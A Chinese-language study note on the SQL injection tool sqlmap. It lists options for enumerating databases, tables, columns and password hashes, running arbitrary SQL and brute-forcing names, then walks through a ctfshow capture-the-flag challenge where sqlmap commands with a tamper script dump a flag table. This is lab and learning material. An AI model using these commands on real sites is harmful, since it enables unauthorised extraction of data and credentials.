---
sidebar_position: 2
---

# SQLMap 工具的使用

ref: [用法 | sqlmap 用户手册](https://sqlmap.highlight.ink/usage)

## 参数

### 指定目标

- `-u`指定目标 url，如`http(s)://targeturl[:port]/[...]`
- `-r`指定原始 HTTP 请求

### 优化

- `--predict-output`可以对数据进行分析预测，不可以与多线程一起使用
- `--keep-alive`可以使用持久化连接，不可以与代理一起使用
- `--null-connection`让 SQLMap 使用 NULL 连接技术，缩短时间，减小带宽
- `--threads`多线程，后面指定数字（最大为 10）

### 指纹识别

`--fingerprint`进行更广泛的指纹识别。

### 枚举与暴力破解

- `--users`枚举用户列表
- `--passwords`枚举用户密码哈希和破解密码明文
- `--dbs`列出所有数据库
- `--tables`列出数据表
- `--columns`列出列名
- `--dump`导出数据表条目
- `--sql-query`运行任意的 SQL 语句

枚举的时候可以指定这些参数：

- `-D`指定数据库名
- `-T`指定数据表名
- `-C`指定列名（用逗号分隔）
- `--start` `--stop`指定导出条目的范围

有关暴力破解的参数：

- `--common-tables`暴力破解表名
- `--common-columns`暴力破解列名

### 其他选项

- `-t`指定一个文件地址，用于写入 sqlmap 产生的所有流量信息
- `--eta`预估完成时间

## 实战

![](/img/sqlmap1.png)
这一题的环境是一个文章列表，点进去具体的文章页面的链接是`index.php?id=2`，我试着用 Burp 抓到 sqlmap 试一试。

```powershell
python sqlmap.py -o -r request.txt --level=4 --tamper="space2comment.py" -tables
...
Database: web7
[3 tables]
+----------------------------------------------------+
| page                                               |
| user                                               |
| flag                                               |
+----------------------------------------------------+
```
看到`web7`下面有flag，可以将其直接dump出来。
```powershell
python sqlmap.py -o -r request.txt --level=4 --tamper="space2comment.py" -dump -D web7 -T flag

[1 entry]
+-----------------------------------------------+
| flag                                          |
+-----------------------------------------------+
| ctfshow{311e669c-c978-4f71-af2b-ea7f3be92a93} |
+-----------------------------------------------+
```
这道题就出来了。